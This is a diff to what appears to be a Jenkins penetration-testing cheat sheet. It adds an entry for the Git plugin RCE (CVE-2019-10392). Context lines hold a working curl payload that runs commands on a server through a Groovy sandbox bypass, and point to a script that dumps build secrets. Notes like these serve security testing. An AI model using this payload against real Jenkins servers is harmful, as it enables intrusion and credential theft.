@@ -53,6 +53,13 @@ If you don't immediately get a reverse shell you can debug by throwing an except
 curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
 ```
 
+Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
+---------------------------------------------------
+[Jenkins Advisory](https://jenkins.io/security/advisory/2019-09-12/), [Credits](https://iwantmore.pizza/posts/cve-2019-10392.html).
+
+This one will only work is a user has the 'Jobs/Configure' rights in the security matrix so it's very specific.
+
+
 Dumping builds to find cleartext secrets
 ========================================
 Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.
